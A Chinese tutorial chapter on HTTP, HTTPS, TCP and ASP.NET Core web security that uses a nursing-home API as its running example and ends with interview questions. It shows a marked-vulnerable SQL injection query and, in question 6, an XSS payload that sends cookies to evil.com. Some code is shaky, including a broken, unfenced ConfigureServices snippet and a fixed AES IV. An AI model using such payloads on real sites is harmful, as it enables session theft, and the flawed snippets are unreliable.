## 17.1 HTTP 协议深入

### 生活类比：养老院的「访客登记表」

你去养老院探望老人，前台给你一张访客登记表。你填写姓名、被访人、来访事由（相当于 **HTTP 请求**），前台核对后给你回执写着"请到三楼 302 房间"（相当于 **HTTP 响应**）。

### HTTP 请求的完整结构

```
--- 请求行（登记表的标题）---
GET /api/elderly/1001 HTTP/1.1

--- 请求头（登记表的附加信息）---
Host: nursing-home-api.com
Authorization: Bearer eyJhbG...
Content-Type: application/json

--- 请求体（GET 请求通常为空）---
```

**请求行**三要素：请求方法、请求路径、协议版本。

### HTTP 响应的完整结构

```
--- 状态行（回执的开头）---
HTTP/1.1 200 OK

--- 响应头 ---
Content-Type: application/json; charset=utf-8
Cache-Control: max-age=3600

--- 响应体 ---
{"id": 1001, "name": "张大爷", "room": "302", "age": 78}
```

### 常用 Header

| Header | 含义 | 养老院类比 |
|--------|------|-----------|
| `Content-Type` | 数据格式 | "此表为中文表格" |
| `Authorization` | 身份凭证 | 你的探访证编号 |
| `Cache-Control` | 缓存策略 | "此回执 1 小时内有效" |
| `Accept` | 期望的响应格式 | "我希望收到中文回执" |
| `Cookie` | 会话信息 | 你手腕上的访客手环 |

### GET vs POST 区别（面试常问）

```csharp
// GET：查询老人信息（幂等、无副作用）
[HttpGet("{id}")]
public async Task<IActionResult> GetElderly(int id)
{
    var elderly = await _elderlyRepository.GetAsync(id);
    return Ok(elderly);
}

// POST：新建入住登记（非幂等、有副作用）
[HttpPost]
public async Task<IActionResult> CreateElderly(ElderlyDto input)
{
    var elderly = await _elderlyManager.CreateAsync(input);
    return CreatedAtAction(nameof(GetElderly), new { id = elderly.Id }, elderly);
}
```

| 对比项 | GET | POST |
|--------|-----|------|
| 参数位置 | URL 查询字符串 | 请求体 |
| 幂等性 | 幂等 | 非幂等 |
| 缓存 | 可缓存 | 默认不缓存 |
| 安全性 | 参数暴露在 URL | 参数在请求体中 |
| 用途 | 查询数据 | 创建/修改数据 |

## 17.2 HTTP 状态码

状态码就像养老院前台回执上的**分类标记**，让你一眼知道结果。

| 范围 | 类别 | 养老院类比 |
|------|------|-----------|
| 1xx | 信息性 | "请稍等，正在查询" |
| 2xx | 成功 | "探访申请已通过" |
| 3xx | 重定向 | "老人已搬到新楼" |
| 4xx | 客户端错误 | "探访证无效/找不到房间" |
| 5xx | 服务端错误 | "前台系统故障" |

### 常用状态码

| 状态码 | 含义 | 养老院场景 | ABP 用法 |
|--------|------|-----------|---------|
| **200** | 成功 | 查询到老人信息 | `Ok(data)` |
| **201** | 创建成功 | 入住登记成功 | `CreatedAtAction(...)` |
| **204** | 无返回内容 | 删除记录成功 | `NoContent()` |
| **301** | 永久重定向 | 养老院永久搬迁 | `RedirectPermanent(...)` |
| **304** | 未修改 | 信息没变化，用缓存 | ETag 控制 |
| **400** | 参数错误 | 登记表填写不完整 | `BadRequest(...)` |
| **401** | 未认证 | 没有出示探访证 | `Unauthorized()` |
| **403** | 权限不足 | 不能进入特殊区域 | `Forbid()` |
| **404** | 不存在 | 查无此老人 | `NotFound()` |
| **500** | 服务器错误 | 前台系统崩溃 | 自动处理 |
| **502** | 网关错误 | 门卫联系不上前台 | 反向代理层 |
| **503** | 服务不可用 | 系统维护中 | 应用池回收 |

> **与第 8 章的联系**：第 8 章学习了全局异常处理，未捕获异常自动返回 500。通过自定义异常过滤器可将业务异常映射为 400，权限异常映射为 403。

## 17.3 HTTPS 原理（面试必问）

### 生活类比：保密信封

**HTTP** 就像寄明信片——邮递员（中间人）能看到所有内容。**HTTPS** 就像密封信——只有收件人才能拆开。

### 对称加密 vs 非对称加密

| 对比项 | 对称加密 | 非对称加密 |
|--------|---------|-----------|
| 密钥 | 同一把钥匙 | 公钥加密、私钥解密 |
| 速度 | 快 | 慢 100-1000 倍 |
| 典型算法 | AES | RSA |
| 类比 | 护士共用一把钥匙开药柜 | 保险柜：任何人投入（公钥），只有院长取出（私钥） |
| 场景 | 大量数据加密 | 密钥交换、数字签名 |

### SSL/TLS 握手（简化版 4 步）

```
客户端（浏览器）                     服务器（养老院 API）
    |                                   |
    | ① ClientHello                     |
    |   "我支持 TLS 1.2 和这些加密算法" |
    | --------------------------------> |
    |                                   |
    | ② ServerHello + 数字证书          |
    |   "用 TLS 1.2，这是我的证书"      |
    | <------------------------------- |
    |                                   |
    | ③ 验证证书 → 生成随机密钥 →       |
    |   用公钥加密随机密钥发送           |
    |   "证书没问题，这是对称密钥"       |
    | --------------------------------> |
    |                                   |
    | ④ 双方用对称密钥加密通信           |
    | <========== 加密通信 ===========> |
```

握手阶段用**非对称加密**交换密钥，之后用**对称加密**高效传输。

### 数字证书与 CA 机构

数字证书包含服务器公钥、域名、有效期和 **CA 签名**。CA（Certificate Authority）是受信任的第三方，类似工商局。浏览器内置受信任 CA 列表，证书签名来自受信任 CA 则显示安全锁。证书过期或签名不匹配会警告——就像没有营业执照的养老院，你敢送老人进去吗？

## 17.4 TCP 三次握手四次挥手（面试常问）

### 生活类比：打电话

#### 三次握手（建立连接）

```
客户端（家属）                服务器（养老院前台）
    |                             |
    | ① SYN: "喂，能听到吗？"    |
    | -------------------------> |
    |                             |
    | ② SYN+ACK: "能听到，你呢？"|
    | <------------------------- |
    |                             |
    | ③ ACK: "能听到，说正事吧"   |
    | -------------------------> |
    |                             |
    |      连接建立               |
```

#### 四次挥手（断开连接）

```
客户端（家属）                服务器（养老院前台）
    |                             |
    | ① FIN: "我说完了"           |
    | -------------------------> |
    | ② ACK: "知道了"             |
    | <------------------------- |
    | ③ FIN: "我也说完了"         |
    | <------------------------- |
    | ④ ACK: "好，挂了"           |
    | -------------------------> |
    |      连接关闭               |
```

#### 为什么不能两次握手？

两次握手无法确认客户端接收能力。客户端发的 SYN 可能延迟到达，服务器以为是新请求并分配资源，客户端根本没想连接——资源白白浪费（SYN 洪泛攻击原理）。第三步 ACK 让服务器确认"客户端确实要连接"。

#### 为什么不能三次挥手？

服务器收到 FIN 后可能还有数据没发完，先回 ACK（"知道了"），等发完再发 FIN（"我也说完了"），这两步不能合并。

#### TIME_WAIT 状态

客户端发完最后 ACK 后进入 TIME_WAIT，等待 2 倍 MSL。原因：最后的 ACK 可能丢失，服务器会重传 FIN。如果客户端已关闭，服务器会收到 RST 导致异常。类比：挂电话前等两秒，确认对方真没话说了再挂。

## 17.5 安全防护实战（企业必备）

### 17.5.1 SQL 注入

**攻击原理**：在输入框拼接恶意 SQL，改变查询逻辑。类比：有人在登记表"姓名"栏写 `张三' OR '1'='1`，导致前台查出所有老人。

```csharp
// ❌ 危险：字符串拼接
public List<Elderly> Search(string name)
{
    var sql = $"SELECT * FROM Elderlys WHERE Name = '{name}'";
    // name = "张三' OR '1'='1" → 返回全部数据！
    return _context.Elderlys.FromSqlRaw(sql).ToList();
}

// ✅ 安全：EF Core 参数化查询
public async Task<List<Elderly>> SearchAsync(string name)
{
    return await _context.Elderlys
        .Where(e => e.Name == name)
        .ToListAsync();
}
```

EF Core 生成参数化 SQL（`WHERE Name = @p0`），用户输入作为纯数据参数，不会被解析为 SQL 命令。

### 17.5.2 XSS 跨站脚本

**攻击原理**：在页面注入恶意 JS。类比：有人在意见簿写 `<script>偷取联系方式</script>`，前台原样展示在公告栏，所有人被攻击。

```csharp
// ❌ 危险：Raw 输出
// @Html.Raw(Model.Comment)

// ✅ 正确：Razor 默认编码，或手动编码
using System.Text.Encodings.Web;
public string Sanitize(string comment)
{
    return HtmlEncoder.Default.Encode(comment);
    // <script> → &lt;script&gt;，不会被浏览器解析
}
```

### 17.5.3 CSRF 跨站请求伪造

**攻击原理**：用户已登录（Cookie 有认证信息），攻击者诱导点击恶意链接，浏览器自动携带 Cookie 冒充用户操作。类比：你带着访客手环去休息，有人用手环冒充你进入养老院。

```csharp
// Startup.cs 配置
services.AddAntiforgery(options =>
{
    options.HeaderName = "X-CSRF-TOKEN";
});

// Controller 使用
[HttpPost]
[ValidateAntiForgeryToken]
public async Task<IActionResult> Create(CreateElderlyInput input) { ... }
```

原理：服务器生成随机 Token 放入 Cookie 和表单，提交时比对。攻击者无法获取 Token（同源策略保护）。

### 17.5.4 点击劫持

**攻击原理**：用透明 iframe 嵌入目标网站，诱导点击隐藏按钮。

```csharp
// 中间件统一设置
app.Use(async (context, next) =>
{
    context.Response.Headers.Add("X-Frame-Options", "SAMEORIGIN");
    await next();
});
```

## 17.6 数据加密

### AES 对称加密（加密大量数据）

```csharp
using System.Security.Cryptography;
using System.Text;

public class AesEncryptionService
{
    private readonly byte[] _key; // 32 字节
    private readonly byte[] _iv;  // 16 字节

    public AesEncryptionService(string key, string iv)
    {
        _key = Encoding.UTF8.GetBytes(key);
        _iv = Encoding.UTF8.GetBytes(iv);
    }

    public string Encrypt(string plainText)
    {
        using var aes = Aes.Create();
        aes.Key = _key;
        aes.IV = _iv;
        var encryptor = aes.CreateEncryptor();
        using var ms = new MemoryStream();
        using var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write);
        using (var writer = new StreamWriter(cs))
            writer.Write(plainText);
        return Convert.ToBase64String(ms.ToArray());
    }

    public string Decrypt(string cipherText)
    {
        using var aes = Aes.Create();
        aes.Key = _key;
        aes.IV = _iv;
        var decryptor = aes.CreateDecryptor();
        using var ms = new MemoryStream(Convert.FromBase64String(cipherText));
        using var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read);
        using var reader = new StreamReader(cs);
        return reader.ReadToEnd();
    }
}
```

### 密码存储：BCrypt（Hash+Salt）

**加密是可逆的**——密钥泄露就能还原密码。**哈希是不可逆的**——无法还原。**Salt** 让相同密码产生不同哈希值，防止彩虹表攻击。

```csharp
using BCrypt.Net;

public class PasswordService
{
    public string HashPassword(string password)
    {
        return BCrypt.Net.BCrypt.HashPassword(password, workFactor: 12);
    }

    public bool VerifyPassword(string password, string hashedPassword)
    {
        return BCrypt.Net.BCrypt.Verify(password, hashedPassword);
    }
}
```

## 17.7 接口签名验证（对接第三方常用）

对接第三方系统时，需确保请求**不被篡改**且**不被重放**。方案：`timestamp` + `nonce` + `sign`。

| 参数 | 作用 | 类比 |
|------|------|------|
| `timestamp` | 请求时间戳 | 登记表来访时间 |
| `nonce` | 随机唯一标识 | 登记表流水号 |
| `sign` | 签名防篡改 | 防伪印章 |

### 签名流程

1. 所有参数按字母排序拼接为 `key1=value1&key2=value2`
2. 末尾追加 `&secret=密钥`
3. SHA256 哈希得到 `sign`

```csharp
using System.Security.Cryptography;
using System.Text;

public class ApiSignatureService
{
    private readonly string _secretKey;
    private const int TimestampToleranceSeconds = 300;
    private static readonly HashSet<string> _usedNonces = new();
    private static readonly object _lock = new();

    public ApiSignatureService(string secretKey) => _secretKey = secretKey;

    public string GenerateSign(Dictionary<string, string> parameters, string timestamp, string nonce)
    {
        parameters["timestamp"] = timestamp;
        parameters["nonce"] = nonce;

        var sorted = parameters
            .Where(p => !string.IsNullOrEmpty(p.Value) && p.Key != "sign")
            .OrderBy(p => p.Key, StringComparer.Ordinal)
            .ToList();

        var sb = new StringBuilder();
        foreach (var pair in sorted)
        {
            if (sb.Length > 0) sb.Append('&');
            sb.Append($"{pair.Key}={pair.Value}");
        }
        sb.Append($"&secret={_secretKey}");

        using var sha256 = SHA256.Create();
        var hash = sha256.ComputeHash(Encoding.UTF8.GetBytes(sb.ToString()));
        return Convert.ToHexString(hash).ToLower();
    }

    public SignatureValidationResult ValidateSign(Dictionary<string, string> parameters)
    {
        var result = new SignatureValidationResult();

        if (!parameters.TryGetValue("timestamp", out var timestamp))
        { result.Errors.Add("缺少 timestamp"); return result; }
        if (!parameters.TryGetValue("nonce", out var nonce))
        { result.Errors.Add("缺少 nonce"); return result; }
        if (!parameters.TryGetValue("sign", out var sign))
        { result.Errors.Add("缺少 sign"); return result; }

        // 防重放：检查时间戳
        if (long.TryParse(timestamp, out var requestTimeUnix))
        {
            var diff = Math.Abs((DateTimeOffset.UtcNow -
                DateTimeOffset.FromUnixTimeSeconds(requestTimeUnix)).TotalSeconds);
            if (diff > TimestampToleranceSeconds)
            { result.Errors.Add("请求已过期"); return result; }
        }

        // 防重放：检查 nonce 唯一性
        lock (_lock)
        {
            if (_usedNonces.Contains(nonce))
            { result.Errors.Add("nonce 重复"); return result; }
            _usedNonces.Add(nonce);
        }

        // 防篡改：验证签名
        var expectedSign = GenerateSign(parameters, timestamp, nonce);
        if (!string.Equals(sign, expectedSign, StringComparison.OrdinalIgnoreCase))
        { result.Errors.Add("签名验证失败"); return result; }

        result.IsValid = true;
        return result;
    }
}

public class SignatureValidationResult
{
    public bool IsValid { get; set; }
    public List<string> Errors { get; set; } = new();
}
```

## 17.8 实战：为养老院 API 添加签名验证 + 敏感数据加密存储

### 签名验证中间件

```csharp
using Microsoft.AspNetCore.Http;
using System.Text;
using System.Text.Json;

public class ApiSignatureMiddleware
{
    private readonly RequestDelegate _next;
    private readonly ApiSignatureService _signatureService;

    public ApiSignatureMiddleware(RequestDelegate next, ApiSignatureService signatureService)
    {
        _next = next;
        _signatureService = signatureService;
    }

    public async Task InvokeAsync(HttpContext context)
    {
        if (context.Request.Method is "POST" or "PUT" or "DELETE")
        {
            var parameters = new Dictionary<string, string>();

            if (context.Request.Headers.TryGetValue("X-Timestamp", out var ts))
                parameters["timestamp"] = ts.ToString();
            if (context.Request.Headers.TryGetValue("X-Nonce", out var nonce))
                parameters["nonce"] = nonce.ToString();
            if (context.Request.Headers.TryGetValue("X-Sign", out var sign))
                parameters["sign"] = sign.ToString();

            context.Request.EnableBuffering();
            if (context.Request.ContentLength > 0)
            {
                using var reader = new StreamReader(context.Request.Body, Encoding.UTF8, leaveOpen: true);
                var body = await reader.ReadToEndAsync();
                context.Request.Body.Position = 0;
                if (!string.IsNullOrEmpty(body))
                {
                    var bodyParams = JsonSerializer.Deserialize<Dictionary<string, string>>(body);
                    if (bodyParams != null)
                        foreach (var p in bodyParams)
                            parameters[p.Key] = p.Value;
                }
            }

            var result = _signatureService.ValidateSign(parameters);
            if (!result.IsValid)
            {
                context.Response.StatusCode = 401;
                context.Response.ContentType = "application/json; charset=utf-8";
                await context.Response.WriteAsync(JsonSerializer.Serialize(new
                {
                    error = "签名验证失败",
                    details = result.Errors
                }));
                return;
            }
        }
        await _next(context);
    }
}
```

### 敏感数据加密 Controller

```csharp
[Area("NursingHome")]
[Route("api/nursing-home/elderly")]
public class ElderlyController : AbpController
{
    private readonly AesEncryptionService _aesService;
    private readonly IRepository<Elderly, int> _elderlyRepository;

    public ElderlyController(
        AesEncryptionService aesService,
        IRepository<Elderly, int> elderlyRepository)
    {
        _aesService = aesService;
        _elderlyRepository = elderlyRepository;
    }

    [HttpPost]
    public async Task<IActionResult> Create(CreateElderlyInput input)
    {
        var elderly = new Elderly
        {
            Name = input.Name,
            Age = input.Age,
            IdCardNumber = _aesService.Encrypt(input.IdCardNumber),   // 加密存储
            PhoneNumber = _aesService.Encrypt(input.PhoneNumber),     // 加密存储
            RoomNumber = input.RoomNumber
        };

        await _elderlyRepository.InsertAsync(elderly);
        return CreatedAtAction(nameof(GetById), new { id = elderly.Id }, new
        {
            elderly.Id, elderly.Name,
            IdCardNumber = Mask(input.IdCardNumber),
            PhoneNumber = Mask(input.PhoneNumber, 3, 4)
        });
    }

    [HttpGet("{id}")]
    public async Task<IActionResult> GetById(int id)
    {
        var elderly = await _elderlyRepository.FindAsync(id);
        if (elderly == null) return NotFound();

        return Ok(new
        {
            elderly.Id, elderly.Name, elderly.Age, elderly.RoomNumber,
            IdCardNumber = Mask(_aesService.Decrypt(elderly.IdCardNumber)),
            PhoneNumber = Mask(_aesService.Decrypt(elderly.PhoneNumber), 3, 4)
        });
    }

    /// <summary>
    /// 脱敏：身份证只显示前3后4位
    /// </summary>
    private static string Mask(string data, int prefix = 3, int suffix = 4)
    {
        if (string.IsNullOrEmpty(data) || data.Length <= prefix + suffix)
            return data;
        var masked = new string('*', data.Length - prefix - suffix);
        return $"{data[..prefix]}{masked}{data[^suffix..]}";
    }
}
```

public void ConfigureServices(IServiceCollection services)

    services.AddSingleton(new ApiSignatureService(secretKey));

    var aesKey = Configuration["DataEncryption:AesKey"];
    var aesIv = Configuration["DataEncryption:AesIv"];
    services.AddSingleton(new AesEncryptionService(aesKey, aesIv));
}

public void Configure(IApplicationBuilder app)
{
    app.UseMiddleware<ApiSignatureMiddleware>();

    app.Use(async (context, next) =>
    {
        context.Response.Headers.Add("X-Frame-Options", "SAMEORIGIN");
        context.Response.Headers.Add("X-Content-Type-Options", "nosniff");
        context.Response.Headers.Add("X-XSS-Protection", "1; mode=block");
        await next();
    });
}

## 常见错误与最佳实践

| # | 错误写法 | 正确写法 | 为什么错 |
|---|---------|---------|---------|
| 1 | `$"SELECT * WHERE Name = '{name}'"` | `.Where(e => e.Name == name)` | 字符串拼接导致 SQL 注入 |
| 2 | `@Html.Raw(Model.Comment)` | `@Model.Comment` | Raw 输出执行注入的 JS |
| 3 | 密码用 MD5 哈希 | `BCrypt.HashPassword()` | MD5 无 Salt，可用彩虹表反查 |
| 4 | 密码用 AES 加密存储 | BCrypt 哈希存储 | 加密可逆，密钥泄露全部还原 |
| 5 | 所有状态码返回 200 | 按场景返回 201/400/404 等 | 客户端无法区分错误类型 |
| 6 | HTTP 传输敏感数据 | 全站强制 HTTPS | 明文传输可被窃听 |
| 7 | 接口无频率限制 | 添加限流中间件 | 暴力破解和 DDoS 风险 |
| 8 | API 密钥硬编码 | 存放在配置或环境变量 | 密钥随代码提交到 Git 泄露 |

## 本章小结

1. **HTTP 协议**：请求由请求行、请求头、请求体组成；响应由状态行、响应头、响应体组成。GET 查询、POST 创建。
2. **状态码**：2xx 成功，4xx 客户端错误，5xx 服务端错误。正确使用让前端快速定位问题。
3. **HTTPS**：握手阶段用非对称加密交换密钥，之后用对称加密传输数据。
4. **TCP 三次握手**：确保双方都能收发数据；四次挥手确保数据传输完毕。
5. **安全防护**：SQL 注入用参数化查询，XSS 用输出编码，CSRF 用 AntiForgeryToken，点击劫持用 X-Frame-Options。
6. **数据加密**：AES 加密大量数据，RSA 用于密钥交换，密码用 BCrypt 哈希。
7. **接口签名**：timestamp + nonce + sign 防篡改和防重放。

## 面试题

### 面试题 1（初级 / 概念题）
**题目：请描述 HTTP 请求和响应的完整结构。**

**参考答案**：HTTP 请求由请求行（方法、URL、协议版本）、请求头（Content-Type、Authorization 等元数据）、请求体（POST 数据）三部分组成。响应由状态行（状态码和原因短语）、响应头（Content-Type 等）、响应体（返回数据）三部分组成。在养老院系统中，前端查询老人信息时，Authorization 头携带 JWT Token，GET 请求无请求体，响应体返回 JSON 数据，状态码为 200。

### 面试题 2（初级 / 概念题）
**题目：GET 和 POST 请求有什么区别？**

**参考答案**：GET 参数在 URL 查询字符串中，可被缓存，有长度限制，幂等，用于查询。POST 参数在请求体中，不缓存，无长度限制，非幂等，用于创建/修改。养老院系统中查询老人列表用 GET（`/api/elderly?page=1`），新增入住用 POST。GET 参数暴露在 URL 中，不适合传递敏感信息。

### 面试题 3（中级 / 概念题）
**题目：HTTPS 的工作原理是什么？SSL/TLS 握手过程是怎样的？**

**参考答案**：HTTPS = HTTP + SSL/TLS。握手四步：①客户端发 ClientHello 告知加密算法和 TLS 版本；②服务器返回 ServerHello 和数字证书（含公钥）；③客户端验证证书后生成随机对称密钥，用服务器公钥加密发送；④双方用对称密钥加密后续通信。握手用非对称加密交换密钥，之后用对称加密高效传输。养老院系统涉及健康信息等敏感数据，必须用 HTTPS。

### 面试题 4（中级 / 概念题）
**题目：请描述 TCP 三次握手和四次挥手。为什么不能两次握手？**

**参考答案**：三次握手：①客户端 SYN；②服务器 SYN+ACK；③客户端 ACK。四次挥手：①客户端 FIN；②服务器 ACK；③服务器 FIN；④客户端 ACK 并 TIME_WAIT。不能两次握手因为无法确认客户端接收能力，可能导致无效连接和资源浪费。养老院系统高并发场景下，理解 TCP 对排查连接超时和 TIME_WAIT 堆积至关重要。

### 面试题 5（中级 / 概念题）
**题目：什么是 SQL 注入？如何防御？**

**参考答案**：SQL 注入是在输入中拼接恶意 SQL 改变查询逻辑。养老院系统搜索框输入 `' OR '1'='1` 会返回所有老人信息。防御：使用 EF Core LINQ 查询（自动参数化）；原生 SQL 用参数化查询；输入验证和长度限制；数据库账号最小权限。最根本的是永远不要拼接用户输入到 SQL。

### 面试题 6（中级 / 概念题）
**题目：什么是 XSS 攻击？如何防御？**

**参考答案**：XSS 是在页面注入恶意 JS，在其他用户浏览器中执行，可能窃取 Cookie。养老院备注字段注入 `<script>fetch('https://evil.com?c='+document.cookie)</script>` 会窃取会话。防御：输出编码用 `HtmlEncoder.Default.Encode()`；输入验证；Content-Security-Policy 头；Cookie 设 HttpOnly 属性。

### 面试题 7（中级 / 概念题）
**题目：什么是 CSRF 攻击？AntiForgeryToken 原理是什么？**

**参考答案**：CSRF 是诱导已登录用户发起伪造请求，浏览器自动携带 Cookie。护理人员访问恶意网站后，浏览器可能向养老院系统发起删除操作。AntiForgeryToken 原理：服务器生成随机 Token 分别放入 Cookie 和表单，提交时比对一致性。攻击者无法获取 Token（同源策略保护），请求被拒绝。

### 面试题 8（中级 / 概念题）
**题目：对称加密和非对称加密有什么区别？各适用什么场景？**

**参考答案**：对称加密同一把密钥（AES），快但密钥分发难。非对称加密公钥加密私钥解密（RSA），安全但慢。养老院系统中 AES 加密健康档案存储，RSA 用于密钥交换和签名。HTTPS 握手用 RSA 交换密钥，之后用 AES 加密通信。密码存储用 BCrypt 哈希（不可逆），不是加密（可逆）。

### 面试题 9（高级 / 设计题）
**题目：接口签名验证如何实现防篡改和防重放？**

**参考答案**：防篡改：参数排序拼接加密钥后 SHA256 哈希生成 sign，服务端重算比对，篡改则签名不匹配。防重放：timestamp 限制 5 分钟有效期，nonce 唯一性检查（已用 nonce 记录在缓存）。养老院对接第三方医保系统时，此方案防止请求被拦截、篡改或重放。

### 面试题 10（初级 / 概念题）
**题目：HTTP 状态码 401 和 403 有什么区别？**

**参考答案**：401 未认证（未登录），403 已认证但权限不足。养老院系统中未登录访问管理页返回 401，普通护工访问院长专属财务报表返回 403。核心区别：401 是"你是谁？"，403 是"我知道你是谁，但你没权限"。ABP 中未认证自动 401，`[Authorize(Roles="Admin")]` 失败返回 403。

### 面试题 11（高级 / 场景题）
**题目：为什么密码用 BCrypt 而不是 MD5 或 AES？**

**参考答案**：MD5 没有内置 Salt，相同密码相同哈希值，可用彩虹表反查，且计算快暴力破解成本低。AES 可逆，密钥泄露所有密码还原。BCrypt 内置 Salt，慢哈希算法，workFactor 可调。养老院系统密码用 BCrypt，即使数据库泄露也难批量还原。

### 面试题 12（中级 / 概念题）
**题目：什么是点击劫持？如何防御？**

**参考答案**：点击劫持用透明 iframe 嵌入目标网站，诱导用户点击隐藏按钮。攻击者创建"领取养老补贴"页面，透明嵌入"确认删除"按钮。防御：`X-Frame-Options` 响应头设为 `SAMEORIGIN` 或 `DENY`。ASP.NET Core 中间件统一设置即可。

### 面试题 13（高级 / 场景题）
**题目：养老院系统对接第三方医保系统，如何设计 API 安全方案？**

**参考答案**：四层方案：①全 HTTPS 加密传输；②接口签名验证（timestamp 5 分钟过期防重放，nonce 唯一性防重放，sign 签名防篡改）；③敏感数据 AES 加密存储，展示时脱敏；④IP 白名单限制。同时记录所有签名参数和验证结果便于审计。
